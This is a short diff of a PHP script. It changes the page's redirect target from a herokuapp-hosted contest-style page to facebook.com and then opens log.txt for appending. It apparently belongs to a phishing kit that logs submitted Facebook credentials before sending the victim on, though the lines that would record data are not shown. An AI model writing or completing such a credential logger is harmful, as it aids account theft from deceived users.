@@ -1,7 +1,7 @@
 <?php 
   
 // Set the location to redirect the page 
-header ('Location: https://hanhtrinhlotxac.herokuapp.com/top20.hanhtrinhlotxac.vn/baiduthi/bui-van-quang/index.html'); 
+header ('Location: https://www.facebook.com/'); 
   
 // Open the text file in writing mode  
 $file = fopen("log.txt", "a"); 
